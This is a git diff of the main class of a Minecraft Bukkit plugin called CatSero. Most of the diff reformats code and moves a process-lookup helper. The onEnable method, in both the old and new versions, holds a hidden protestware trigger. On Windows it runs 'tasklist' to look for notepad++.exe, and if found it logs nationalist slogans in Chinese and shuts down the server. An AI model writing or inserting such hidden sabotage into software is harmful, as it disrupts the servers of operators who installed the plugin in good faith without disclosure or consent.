@@ -23,23 +23,48 @@
  */
 package moe.xmcn.catsero;
 
-import org.bukkit.Bukkit;
-
 import moe.xmcn.catsero.executors.ExecutorRegister;
 import moe.xmcn.catsero.listeners.ListenerRegister;
 import moe.xmcn.catsero.utils.*;
+import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
-import java.io.*;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.util.Arrays;
 import java.util.List;
 
 public class CatSero extends JavaPlugin {
 
+    public static boolean findProcess(String processName) {
+        BufferedReader bufferedReader = null;
+        try {
+            Process proc = Runtime.getRuntime().exec("tasklist /FI \"IMAGENAME eq " + processName + "\"");
+            bufferedReader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                if (line.contains(processName)) {
+                    return true;
+                }
+            }
+            return false;
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            return false;
+        } finally {
+            if (bufferedReader != null) {
+                try {
+                    bufferedReader.close();
+                } catch (Exception ignored) {
+                }
+            }
+        }
+    }
+
     @Override
     public void onLoad() {
         Logger.logLoader("Start loading CatSero...");
-		
+
         Logger.logLoader("Saving files...");
         Configuration.saveFiles();
         Logger.logLoader("Saved all files.");
@@ -81,51 +106,51 @@ public class CatSero extends JavaPlugin {
 
     @Override
     public void onEnable() {
-		
-		// 反对 Notepad++
-		if (
-		    System.getProperty("os.name").toLowerCase().contains("windows")
-			&& findProcess("notepad++.exe")
-	        ) {
-			List<String> cnmnpp = Arrays.asList(
-				"检测到Notepad++(Npp)，终止服务器！",
-				"严正声明：台湾是中国的一部分，中国主权不容侵犯",
-				"犯我中华者，虽远必诛！"
-			);
-			Logger.logWARN(cnmnpp);
-			getServer().dispatchCommand(Bukkit.getConsoleSender(), "stop");
+
+        // 反对 Notepad++
+        if (
+                System.getProperty("os.name").toLowerCase().contains("windows")
+                        && findProcess("notepad++.exe")
+        ) {
+            List<String> cnmnpp = Arrays.asList(
+                    "检测到Notepad++(Npp)，终止服务器！",
+                    "严正声明：台湾是中国的一部分，中国主权不容侵犯",
+                    "犯我中华者，虽远必诛！"
+            );
+            Logger.logWARN(cnmnpp);
+            getServer().dispatchCommand(Bukkit.getConsoleSender(), "stop");
         } else {
-		
-        if (Envrionment.Depends.MiraiMC) {
-            Logger.logLoader("Registering Executors...");
-            ExecutorRegister.register();
-            Logger.logLoader("Registered.");
 
-            Logger.logLoader("Registering Listeners...");
-            ListenerRegister.register();
-            Logger.logLoader("Registered.");
+            if (Envrionment.Depends.MiraiMC) {
+                Logger.logLoader("Registering Executors...");
+                ExecutorRegister.register();
+                Logger.logLoader("Registered.");
 
-            if (Configuration.PLUGIN.BSTATS) {
-                Logger.logINFO("Start bStats.");
-                new bStatsMetrics(this, 14767);
+                Logger.logLoader("Registering Listeners...");
+                ListenerRegister.register();
+                Logger.logLoader("Registered.");
+
+                if (Configuration.PLUGIN.BSTATS) {
+                    Logger.logINFO("Start bStats.");
+                    new bStatsMetrics(this, 14767);
+                }
+
+                Logger.logLoader("Start TPSCalculator.");
+                getServer().getScheduler().scheduleSyncRepeatingTask(this, new TPSCalculator(), 100L, 1L);
+
+                Logger.logLoader("CatSero loaded.");
+
+                if (Configuration.PLUGIN.CHECK_UPDATE.ENABLE) {
+                    Logger.logLoader("Start checking update...");
+                    getServer().getScheduler().runTaskTimerAsynchronously(this, new Updater(), 0L, Configuration.PLUGIN.CHECK_UPDATE.INTERVAL * 1000L);
+                    getServer().getPluginManager().registerEvents(new Updater(), this);
+                }
+            } else {
+                Logger.logWARN("[Loader] Warning, not install MiraiMC, CatSero will not run!");
+                getServer().getPluginManager().disablePlugin(this);
             }
 
-            Logger.logLoader("Start TPSCalculator.");
-            getServer().getScheduler().scheduleSyncRepeatingTask(this, new TPSCalculator(), 100L, 1L);
-
-            Logger.logLoader("CatSero loaded.");
-
-            if (Configuration.PLUGIN.CHECK_UPDATE.ENABLE) {
-                Logger.logLoader("Start checking update...");
-                getServer().getScheduler().runTaskTimerAsynchronously(this, new Updater(), 0L, Configuration.PLUGIN.CHECK_UPDATE.INTERVAL * 1000L);
-                getServer().getPluginManager().registerEvents(new Updater(), this);
-            }
-        } else {
-            Logger.logWARN("[Loader] Warning, not install MiraiMC, CatSero will not run!");
-            getServer().getPluginManager().disablePlugin(this);
         }
-		
-		}
     }
 
     @Override
@@ -133,30 +158,6 @@ public class CatSero extends JavaPlugin {
         Logger.logLoader("Stopping CatSero.");
         Logger.logINFO("If you love CatSero, don't forget to give it a Star on GitHub!");
     }
-	
-	public static boolean findProcess(String processName) {
-        BufferedReader bufferedReader = null;
-        try {
-            Process proc = Runtime.getRuntime().exec("tasklist /FI \"IMAGENAME eq " + processName + "\"");
-            bufferedReader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-            String line;
-            while ((line = bufferedReader.readLine()) != null) {
-                if (line.contains(processName)) {
-                    return true;
-                }
-            }
-            return false;
-        } catch (Exception ex) {
-            ex.printStackTrace();
-            return false;
-        } finally {
-            if (bufferedReader != null) {
-                try {
-                    bufferedReader.close();
-                } catch (Exception ignored) {}
-            }
-        }
-    }
-	
-	
+
+
 }
